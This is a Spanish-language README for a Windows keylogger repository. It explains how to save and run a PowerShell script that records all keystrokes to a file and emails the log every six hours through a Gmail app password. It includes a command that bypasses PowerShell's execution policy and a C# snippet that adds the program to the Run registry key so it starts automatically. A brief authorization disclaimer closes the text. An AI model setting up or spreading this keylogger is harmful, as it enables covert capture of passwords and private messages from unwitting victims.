# Keylogger-Windows
Keylogger en C# (registrador de pulsaciones de teclas) que captura las teclas presionadas por el usuario, las guarda en un archivo y las envía por mail.

Ver las instrucciones en mi blog https://ronbhack.com/como-hacer-un-keylogger-en-2024/

Nota: para poder enviar el correo correctamente se debe crear una «contraseña de aplicación» en gmail, esta contraseña tiene 16 digitos

1. Abre el Bloc de notas:

◦ Ve al menú Inicio de Windows y busca «Bloc de notas».
◦ Haz clic derecho sobre el Bloc de notas y selecciona «Ejecutar como administrador» para asegurarte de tener los permisos necesarios.

2. Copia y Pega este script PowerShell: ronblogger.ps1 

3. Guarda el archivo:

◦ Ve a «Archivo» en la barra de menú del Bloc de notas y selecciona «Guardar como».
◦ Elige una ubicación para guardar tu archivo y asigna el nombre ronblogger con la extensión «.ps1» al final del nombre del archivo. ejemplo, «ronblogger.ps1».

4. Selecciona el tipo de archivo correcto:

◦ En la ventana «Guardar como tipo», selecciona «Todos los archivos (.)» en lugar de «Documentos de texto (*.txt)».

5. Haz clic en «Guardar»:

◦ Haz clic en el botón «Guardar» para guardar tu archivo .ps1.

Ahora has creado un archivo de script PowerShell. Puedes ejecutar este script desde la línea de comandos de PowerShell utilizando el comando .\MiScript.ps1 si estás en el directorio correcto o proporcionando la ruta completa al archivo. Recuerda que es posible que necesites ajustar la política de ejecución de PowerShell si encuentras problemas para ejecutar scripts. Puedes hacerlo ejecutando Set-ExecutionPolicy RemoteSigned en PowerShell con privilegios de administrador.

6. Abrir consola de Powershell
Abre el símbolo del sistema de PowerShell. Puedes buscar «PowerShell» en el menú de inicio o presionar la combinación de teclas Win + X y seleccionar «Windows PowerShell» y ejecutalo como administrador.

7. Comando en Powershell para el keylogger
powershell.exe -ExecutionPolicy Bypass -File «D:\( aquí busca tu ruta donde guardaste el archivo ronblogger.ps1 )\ronblogger.ps1»

Probando el Keylogger
Una vez que hayas realizado estos pasos entonces todo lo que escribas quedara guardado en un block de notas que se guardara en la carpeta Documents en tu Windows.

Además esta la función de enviar todo lo escrito cada 6 horas a tu correo, para hacer esto debes modificar el código, donde dice tu correo y tu contraseña para ser enviado.

Agregando funcionalidades
Si deseas que este programa se inicie cada vez que inicie Windows entonces agrega estas líneas de código al final.

 private static void AddToStartup()
        {
            string executablePath = Process.GetCurrentProcess().MainModule.FileName;
            string runKey = @"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run";
            Microsoft.Win32.Registry.SetValue(runKey, "ronblogger", executablePath);
        }

Disclaimer
Recuerda que solo debes usar esto con autorización, en casa de que lo uses sin permiso debes tener claro que esto esta penado por ley, No seas un cibercriminal por que eso terminal MAL!.
